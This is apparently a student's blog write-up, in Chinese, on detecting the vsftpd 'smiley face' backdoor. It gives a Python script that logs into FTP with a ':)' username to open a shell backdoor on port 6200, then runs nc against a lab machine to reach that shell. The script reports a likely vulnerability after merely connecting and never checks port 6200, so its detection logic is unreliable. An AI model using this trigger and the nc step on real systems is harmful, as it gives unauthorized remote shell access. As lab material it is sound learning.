# 笑脸漏洞检测

<br>

经过查询得知python的socket库中包含网络探测所需要的函数，在代码前面导入该库

<br>

<img src="https://54huarui.github.io/blogs/zuoye4/1.png" width="880" height="480">

<br>

## 编写

<br>

先导入socket库以及FTP库

<br>

````
import socket
from ftplib import FTP
````

<br>

接下来获取输入指定目标ip

<br>

````
ip = input("检测ip:")
````

<br>

编写FTP连接部分

笑脸漏洞即账号名中带有:) 的时候，会打开一个开放在6200端口的后门，可以连接到靶机的shell

<br>

````
    ftp = FTP()
    user = "test:)"
    passwd = "123"
    ftp.connect(ip, 21, timeout=100)
    print("成功连接 很可能存在笑脸漏洞")
    response = ftp.login(user, passwd)
    ftp.quit()
````

<br>


全部代码如下:

<br>

````
import socket
from ftplib import FTP

ip = input("检测ip:")
smile_port = "6200"

try:
    ftp = FTP()
    user = "test:)"
    passwd = "123"
    ftp.connect(ip, 21, timeout=100)
    print("成功连接 很可能存在笑脸漏洞")
    response = ftp.login(user, passwd)
    ftp.quit()
except:
    print("连接失败，可能不存在笑脸漏洞")

````
<br>

## 实验

<br><br>

输入我的靶机ip

<br>

<img src="https://54huarui.github.io/blogs/zuoye4/2.png" width="880" height="480">

<br>

提示存在笑脸漏洞，使用命令 nc 靶机ip 端口

可以直接连接上对方的shell，利用成功

<br>

<img src="https://54huarui.github.io/blogs/zuoye4/3.png" width="880" height="480">

<br>





